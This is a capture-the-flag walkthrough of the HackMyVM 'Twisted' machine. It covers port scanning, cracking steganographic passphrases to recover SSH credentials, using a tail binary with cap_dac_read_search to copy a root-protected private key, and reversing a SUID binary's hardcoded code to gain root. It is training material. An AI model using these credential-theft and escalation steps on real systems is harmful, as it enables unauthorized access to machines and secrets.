# Twisted

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Twisted | sml | Beginner | HackMyVM |

**Summary:** Twisted is a beginner-level machine from HackMyVM that combines steganography, Linux capabilities abuse, and simple reverse engineering. The attack path involves discovering embedded credentials in JPEG files using steganographic techniques, leveraging SSH access to perform lateral movement, exploiting Linux capabilities on the `tail` binary to read restricted files, and finally exploiting a custom SUID binary that requires hexadecimal conversion to achieve root privileges. This machine excellently demonstrates the importance of proper file permissions, secure steganography practices, and the security implications of Linux capabilities.

---

## Reconnaissance

### Network Discovery

I began by scanning the target network to identify the machine's IP address:

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP             MAC               Vendor
--             ---               ------
192.168.100.50 08:00:27:B3:AB:43 VirtualBox
```

The target machine was identified at `192.168.100.50` with a VirtualBox MAC address, confirming this is our target VM.

### Port Scanning

Next, I performed comprehensive TCP and UDP port scans to identify available services:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/twisted]
└─$ nmap -sC -sV -p- 192.168.100.50
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-30 14:57 WIB
Nmap scan report for 192.168.100.50
Host is up (0.0073s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx 1.14.2
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.2
2222/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 67:63:a0:c9:8b:7a:f3:42:ac:49:ab:a6:a7:3f:fc:ee (RSA)
|   256 8c:ce:87:47:f8:b8:1a:1a:78:e5:b7:ce:74:d7:f5:db (ECDSA)
|_  256 92:94:66:0b:92:d3:cf:7e:ff:e8:bf:3c:7b:41:b7:5a (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.18 seconds
```

UDP scan revealed no significant open ports:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/twisted]
└─$ nmap -sU --top-ports 100 192.168.100.50
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-30 15:00 WIB
Nmap scan report for 192.168.100.50
Host is up (0.0010s latency).
All 100 scanned ports on 192.168.100.50 are in ignored states.
Not shown: 57 closed udp ports (port-unreach), 43 open|filtered udp ports (no-response)

Nmap done: 1 IP address (1 host up) scanned in 55.59 seconds
```

**Key Findings:**
- **Port 80**: nginx 1.14.2 web server
- **Port 2222**: OpenSSH 7.9p1 (non-standard SSH port)
- Target OS: Debian Linux

---

## Web Application Analysis

### Initial Web Reconnaissance

I started by examining the HTTP service to understand the web application:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/twisted]
└─$ curl -I http://192.168.100.50
HTTP/1.1 200 OK
Server: nginx/1.14.2
Date: Fri, 30 Jan 2026 08:01:59 GMT
Content-Type: text/html
Content-Length: 230
Last-Modified: Wed, 14 Oct 2020 06:57:20 GMT
Connection: keep-alive
ETag: "5f86a150-e6"
Accept-Ranges: bytes
```

The website content revealed an interesting message:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/twisted]
└─$ curl http://192.168.100.50
<h1>I love cats!</h1>
<img src="cat-original.jpg" alt="Cat original"  width="400" height="400">
<br>

<h1>But I prefer this one because seems different</h1>

<img src="cat-hidden.jpg" alt="Cat Hidden" width="400" height="400">
```

The website displays two cat images with a suggestive message about one being "different," hinting at possible steganography.

### Image Analysis and Steganography

I downloaded both images for analysis:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/twisted]
└─$ wget http://192.168.100.50/cat-original.jpg && wget http://192.168.100.50/cat-hidden.jpg
--2026-01-30 15:03:18--  http://192.168.100.50/cat-original.jpg
Connecting to 192.168.100.50:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 288693 (282K) [image/jpeg]
Saving to: 'cat-original.jpg'

cat-original.jpg             100%[===========================================>] 281.93K  --.-KB/s    in 0.03s

--2026-01-30 15:03:18--  http://192.168.100.50/cat-hidden.jpg
Connecting to 192.168.100.50:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 288706 (282K) [image/jpeg]
Saving to: 'cat-hidden.jpg'

cat-hidden.jpg               100%[===========================================>] 281.94K  --.-KB/s    in 0.06s
```

Initial analysis showed minimal differences in file sizes (13 bytes), suggesting embedded data:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/twisted]
└─$ ls -la
total 608
drwxr-xr-x   2 ouba ouba   4096 Jan 30 15:03 .
drwxrwxrwt 114 root root  36864 Jan 30 14:56 ..
-rw-r--r--   1 ouba ouba 288706 Oct 14  2020 cat-hidden.jpg
-rw-r--r--   1 ouba ouba 288693 Oct 14  2020 cat-original.jpg
```

EXIF data analysis revealed identical metadata:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/twisted]
└─$ exiftool -a -u -g1 cat-original.jpg cat-hidden.jpg
======== cat-original.jpg
---- ExifTool ----
ExifTool Version Number         : 13.36
---- System ----
File Name                       : cat-original.jpg
Directory                       : .
File Size                       : 289 kB
File Modification Date/Time     : 2020:10:14 13:51:44+07:00
File Access Date/Time           : 2026:01:30 15:03:40+07:00
File Inode Change Date/Time     : 2026:01:30 15:03:18+07:00
File Permissions                : -rw-r--r--
---- File ----
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Image Width                     : 2400
Image Height                    : 1347
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
---- JFIF ----
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 300
Y Resolution                    : 300
---- Composite ----
Image Size                      : 2400x1347
Megapixels                      : 3.2
======== cat-hidden.jpg
[Similar output with identical metadata]
```

### Steganography Discovery

Initial steghide attempts required passphrases:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/twisted]
└─$ steghide info cat-hidden.jpg
"cat-hidden.jpg":
  format: jpeg
  capacity: 16.2 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase:
steghide: could not extract any data with that passphrase!
...
```

I used `stegseek` with the rockyou wordlist for automated cracking:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/twisted]
└─$ stegseek cat-hidden.jpg /usr/share/wordlists/rockyou.txt
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "se[REDACTED]"
[i] Original filename: "mateo.txt".
[i] Extracting to "cat-hidden.jpg.out".


┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/twisted]
└─$ stegseek cat-original.jpg /usr/share/wordlists/rockyou.txt
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "we[REDACTED]"
[i] Original filename: "markus.txt".
[i] Extracting to "cat-original.jpg.out".
```

**Breakthrough!** Both images contained hidden files with usernames matching the filenames.

### Credential Extraction

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/twisted]
└─$ cat cat-hidden.jpg.out
thi[REDACTED]

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/twisted]
└─$ cat cat-original.jpg.out
mar[REDACTED]
```

**Discovered Credentials:**
- `mateo:thi[REDACTED]`
- `markus:mar[REDACTED]`

---

## Initial Access

### SSH Access Verification

With the discovered credentials, I attempted SSH connections on the non-standard port 2222:

**Mateo Login:**
```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/twisted]
└─$ ssh mateo@192.168.100.50 -p 2222
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
mateo@192.168.100.50's password:
Linux twisted 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Oct 14 03:21:44 2020 from 192.168.1.58
mateo@twisted:~$ id
uid=1000(mateo) gid=1000(mateo) groups=1000(mateo),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
```

**Markus Login:**
```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/twisted]
└─$ ssh markus@192.168.100.50 -p 2222
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
markus@192.168.100.50's password:
Permission denied, please try again.
markus@192.168.100.50's password:
Linux twisted 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64
...
markus@twisted:~$ id
uid=1001(markus) gid=1001(markus) groups=1001(markus)
```

Both users successfully authenticated, providing initial access to the system.

---

## Internal Enumeration

### Markus User Analysis

Exploring Markus's home directory revealed crucial intelligence:

```bash
markus@twisted:~$ ls -la
total 32
drwxr-xr-x 3 markus markus 4096 Jan 30 03:18 .
drwxr-xr-x 5 root   root   4096 Oct 14  2020 ..
-rw------- 1 markus markus    8 Jan 30 03:18 .bash_history
-rw-r--r-- 1 markus markus  220 Oct 14  2020 .bash_logout
-rw-r--r-- 1 markus markus 3526 Oct 14  2020 .bashrc
drwxr-xr-x 3 markus markus 4096 Oct 14  2020 .local
-rw------- 1 markus markus   85 Oct 14  2020 note.txt
-rw-r--r-- 1 markus markus  807 Oct 14  2020 .profile

markus@twisted:~$ cat note.txt
Hi bonita,
I have saved your id_rsa here: /var/cache/apt/id_rsa
Nobody can find it.
```

This note revealed:
1. **New user discovered**: `bonita`
2. **SSH private key location**: `/var/cache/apt/id_rsa`
3. **Security assumption**: "Nobody can find it"

Examining the key file permissions:

```bash
markus@twisted:~$ ls -la /var/cache/apt/id_rsa
-rw------- 1 root root 1823 Oct 14  2020 /var/cache/apt/id_rsa
```

The private key is owned by root with restrictive permissions, preventing direct access.

### User Directory Analysis

```bash
markus@twisted:~$ ls -la /home
total 20
drwxr-xr-x  5 root   root   4096 Oct 14  2020 .
drwxr-xr-x 18 root   root   4096 Oct 13  2020 ..
drwxr-xr-x  4 bonita bonita 4096 Oct 14  2020 bonita
drwxr-xr-x  3 markus markus 4096 Jan 30 03:18 markus
drwxr-xr-x  3 mateo  mateo  4096 Oct 14  2020 mateo
```

Exploring Bonita's directory structure:

```bash
markus@twisted:~$ cd /home/bonita
markus@twisted:/home/bonita$ ls -la
total 52
drwxr-xr-x 4 bonita bonita  4096 Oct 14  2020 .
drwxr-xr-x 5 root   root    4096 Oct 14  2020 ..
-rw-r--r-- 1 bonita bonita   220 Oct 14  2020 .bash_logout
-rw-r--r-- 1 bonita bonita  3526 Oct 14  2020 .bashrc
-rwsrws--- 1 root   bonita 16864 Oct 14  2020 beroot
drwxr-xr-x 3 bonita bonita  4096 Oct 14  2020 .local
-rw-r--r-- 1 bonita bonita   807 Oct 14  2020 .profile
drwx------ 2 bonita bonita  4096 Oct 14  2020 .ssh
-rw------- 1 bonita bonita    12 Oct 14  2020 user.txt
```

**Critical findings:**
- **User flag**: `user.txt` (owned by bonita, requires lateral movement)
- **SUID binary**: `beroot` (potential privilege escalation vector)

### Mateo User Analysis

```bash
mateo@twisted:~$ ls -la
total 36
drwxr-xr-x 3 mateo mateo 4096 Oct 14  2020 .
drwxr-xr-x 5 root  root  4096 Oct 14  2020 ..
-rw------- 1 mateo mateo   13 Jan 30 03:17 .bash_history
-rw-r--r-- 1 mateo mateo  220 Oct 13  2020 .bash_logout
-rw-r--r-- 1 mateo mateo 3526 Oct 13  2020 .bashrc
drwxr-xr-x 3 mateo mateo 4096 Oct 14  2020 .local
-rw------- 1 mateo mateo   25 Oct 14  2020 note.txt
-rw-r--r-- 1 mateo mateo  807 Oct 13  2020 .profile
-rw------- 1 mateo mateo   53 Oct 14  2020 .Xauthority

mateo@twisted:~$ cat note.txt
/var/www/html/gogogo.wav
```

Mateo's note points to an audio file in the web directory:

```bash
mateo@twisted:~$ cd /var/www/html
mateo@twisted:/var/www/html$ ls -la
total 1684
drwxr-xr-x 2 www-data www-data    4096 Oct 14  2020 .
drwxr-xr-x 3 root     root        4096 Oct 14  2020 ..
-rw-r--r-- 1 www-data www-data  288706 Oct 14  2020 cat-hidden.jpg
-rw-r--r-- 1 www-data www-data  288693 Oct 14  2020 cat-original.jpg
-rwxrwxrwx 1 www-data www-data 1130160 Oct 14  2020 gogogo.wav
-rw-r--r-- 1 www-data www-data     230 Oct 14  2020 index.nginx-debian.html
```

### Audio File Analysis

I downloaded and analyzed the audio file:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/twisted]
└─$ wget http://192.168.100.50/gogogo.wav
--2026-01-30 15:32:08--  http://192.168.100.50/gogogo.wav
Connecting to 192.168.100.50:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1130160 (1.1M) [application/octet-stream]
Saving to: 'gogogo.wav'

gogogo.wav                   100%[===========================================>]   1.08M  --.-KB/s    in 0.06s

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/twisted]
└─$ file gogogo.wav
gogogo.wav: RIFF (little-endian) data, WAVE audio, Microsoft PCM, 8 bit, mono 11050 Hz
```

The audio file contains morse code that decodes to:

![](image.png)

The decoded message reads: **"GODEEPER...COMEWITHME...LITTLERABBIT..."**

---

## Lateral Movement

### Linux Capabilities Enumeration

To access Bonita's SSH key, I searched for alternative privilege escalation vectors:

```bash
markus@twisted:/home/bonita$ find / -type f -perm -4000 -exec ls -la {} \; 2>/dev/null
-rwsrws--- 1 root bonita 16864 Oct 14  2020 /home/bonita/beroot
-rwsr-xr-x 1 root root 63568 Jan 10  2019 /usr/bin/su
-rwsr-xr-x 1 root root 34888 Jan 10  2019 /usr/bin/umount
-rwsr-xr-x 1 root root 84016 Jul 27  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
-rwsr-xr-x 1 root root 51280 Jan 10  2019 /usr/bin/mount
-rwsr-xr-x 1 root root 54096 Jul 27  2018 /usr/bin/chfn
-rwsr-xr-x 1 root root 44528 Jul 27  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root 44440 Jul 27  2018 /usr/bin/newgrp
-rwsr-xr-x 1 root root 436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device

markus@twisted:/home/bonita$ /sbin/getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_raw+ep
/usr/bin/tail = cap_dac_read_search+ep
```

**Critical Discovery**: The `tail` binary has the `cap_dac_read_search+ep` capability!

### Capability Exploitation

The `cap_dac_read_search` capability allows bypassing file read permissions. According to GTFOBins:

![](image-1.png)

This capability enables reading any file on the system, including Bonita's private SSH key:

```bash
markus@twisted:/home/bonita$ /usr/bin/tail -c+0 /var/cache/apt/id_rsa > /tmp/bonita_rsa
markus@twisted:/home/bonita$ chmod 600 /tmp/bonita_rsa
markus@twisted:/home/bonita$ ls -la /tmp/bonita_rsa
-rw------- 1 markus markus 1823 Jan 30 04:00 /tmp/bonita_rsa
```

### SSH Key Authentication

Using the extracted private key to authenticate as Bonita:

```bash
markus@twisted:/home/bonita$ ssh -i /tmp/bonita_rsa bonita@localhost -p 2222
Linux twisted 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64
...
bonita@twisted:~$ id
uid=1002(bonita) gid=1002(bonita) groups=1002(bonita)
```

**Successful lateral movement** to the Bonita user account!

---

## Privilege Escalation

### SUID Binary Analysis

As Bonita, I examined the custom SUID binary:

```bash
bonita@twisted:~$ ls -la
total 56
drwxr-xr-x 4 bonita bonita  4096 Jan 30 04:11 .
drwxr-xr-x 5 root   root    4096 Oct 14  2020 ..
-rw------- 1 root   root      36 Jan 30 04:11 .bash_history
-rw-r--r-- 1 bonita bonita   220 Oct 14  2020 .bash_logout
-rw-r--r-- 1 bonita bonita  3526 Oct 14  2020 .bashrc
-rwsrws--- 1 root   bonita 16864 Oct 14  2020 beroot
drwxr-xr-x 3 bonita bonita  4096 Oct 14  2020 .local
-rw-r--r-- 1 bonita bonita   807 Oct 14  2020 .profile
drwx------ 2 bonita bonita  4096 Oct 14  2020 .ssh
-rw------- 1 bonita bonita    12 Oct 14  2020 user.txt

bonita@twisted:~$ file beroot
beroot: setuid, setgid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=fecfbde059505a54f66d3229cc9ebb78f997a7ba, not stripped
```

The binary prompts for a code:

```bash
bonita@twisted:~$ ./beroot
Enter the code:
 7777

WRONG
```

### Reverse Engineering

Since the binary is not stripped, I could analyze its assembly code:

```bash
bonita@twisted:~$ objdump -d beroot | grep -A 20 "<main>:"
0000000000001185 <main>:
    1185:       55                      push   %rbp
    1186:       48 89 e5                mov    %rsp,%rbp
    1189:       48 83 ec 20             sub    $0x20,%rsp
    118d:       89 7d ec                mov    %edi,-0x14(%rbp)
    1190:       48 89 75 e0             mov    %rsi,-0x20(%rbp)
    1194:       48 8d 3d 69 0e 00 00    lea    0xe69(%rip),%rdi        # 2004 <_IO_stdin_used+0x4>
    119b:       b8 00 00 00 00          mov    $0x0,%eax
    11a0:       e8 ab fe ff ff          callq  1050 <printf@plt>
    11a5:       48 8d 45 fc             lea    -0x4(%rbp),%rax
    11a9:       48 89 c6                mov    %rax,%rsi
    11ac:       48 8d 3d 63 0e 00 00    lea    0xe63(%rip),%rdi        # 2016 <_IO_stdin_used+0x16>
    11b3:       b8 00 00 00 00          mov    $0x0,%eax
    11b8:       e8 a3 fe ff ff          callq  1060 <scanf@plt>
    11bd:       8b 45 fc                mov    -0x4(%rbp),%eax
    11c0:       3d f8 16 00 00          cmp    $0x16f8,%eax
    11c5:       75 31                   jne    11f8 <main+0x73>
    11c7:       bf 00 00 00 00          mov    $0x0,%edi
    11cc:       b8 00 00 00 00          mov    $0x0,%eax
    11d1:       e8 aa fe ff ff          callq  1080 <setuid@plt>
    11d6:       bf 00 00 00 00          mov    $0x0,%edi
```

**Key finding**: The binary compares user input against the hexadecimal value `0x16f8`.

### Hexadecimal Conversion

I converted the hex value to decimal:

![convert](image-3.png)

The hex value `0x16f8` equals `5[REDACTED]` in decimal.

### Root Shell Achievement

Using the correct code:

```bash
bonita@twisted:~$ ./beroot
Enter the code:
 5[REDACTED]
root@twisted:~# id
uid=0(root) gid=0(root) groups=0(root),1002(bonita)
```

**SUCCESS!** Root privileges achieved!

### Flag Collection

```bash
root@twisted:~# cat /home/bonita/user.txt /root/root.txt
HMVb[REDACTED]
HMVw[REDACTED]
```

Both flags successfully captured!

---

## Attack Chain Summary

1. **Reconnaissance**: Network scan identified target at 192.168.100.50 with nginx (port 80) and SSH (port 2222) services
2. **Vulnerability Discovery**: Web application revealed two cat images with steganographic content containing embedded user credentials
3. **Steganography Exploitation**: Used stegseek to crack steganographic passwords ("se[REDACTED]" and "we[REDACTED]") and extracted credentials for mateo and markus users
4. **Initial Access**: SSH authentication with discovered credentials (mateo:thi[REDACTED], markus:mar[REDACTED]) provided initial system access
5. **Internal Enumeration**: User enumeration revealed bonita user and location of her SSH private key at /var/cache/apt/id_rsa
6. **Capability Exploitation**: Discovered tail binary with cap_dac_read_search capability, enabling bypass of file read restrictions to extract bonita's private key
7. **Lateral Movement**: Used extracted SSH key for privilege escalation to bonita user account
8. **Reverse Engineering**: Reverse engineered custom SUID binary 'beroot', identified hardcoded hex comparison value (0x16f8), converted to decimal (5[REDACTED])
9. **Privilege Escalation**: Successfully executed SUID binary with correct code (5[REDACTED]) to achieve root privileges and capture both user and root flags